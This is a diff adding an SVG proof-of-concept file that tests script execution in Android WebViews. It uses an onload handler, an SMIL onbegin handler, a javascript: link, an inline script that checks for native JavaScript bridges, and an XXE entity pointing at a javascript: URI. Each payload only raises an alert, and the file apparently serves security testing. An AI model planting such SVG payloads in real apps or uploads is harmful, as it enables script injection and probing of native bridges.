@@ -1,0 +1,54 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [
+  <!ENTITY xxe SYSTEM "javascript:alert('SVG XXE executed')">
+]>
+<svg xmlns="http://www.w3.org/2000/svg"
+     xmlns:xlink="http://www.w3.org/1999/xlink"
+     width="400"
+     height="120"
+     onload="alert('SVG onload executed in WebView')">
+
+  <!-- Background -->
+  <rect width="100%" height="100%" fill="#111"/>
+
+  <!-- Visible text -->
+  <text x="50%" y="50%"
+        dominant-baseline="middle"
+        text-anchor="middle"
+        fill="#0f0"
+        font-size="18">
+    Android WebView SVG PoC
+  </text>
+
+  <!-- SMIL animation-based execution (older WebViews) -->
+  <animate
+    attributeName="x"
+    from="0"
+    to="0"
+    begin="0s"
+    onbegin="alert('SVG SMIL executed')" />
+
+  <!-- javascript: URL execution -->
+  <a xlink:href="javascript:alert('SVG javascript: URL executed')">
+    <rect x="0" y="0" width="1" height="1" fill="transparent"/>
+  </a>
+
+  <!-- Inline script execution -->
+  <script type="application/ecmascript">
+    <![CDATA[
+      alert('SVG <script> executed');
+
+      // Detect common Android JS bridges
+      if (window.Android) {
+        alert('Android JS bridge detected');
+      }
+      if (window.webkit && window.webkit.messageHandlers) {
+        alert('WKWebView-style bridge detected');
+      }
+    ]]>
+  </script>
+
+  <!-- Entity expansion trigger -->
+  <text x="10" y="110" font-size="1">&xxe;</text>
+
+</svg>
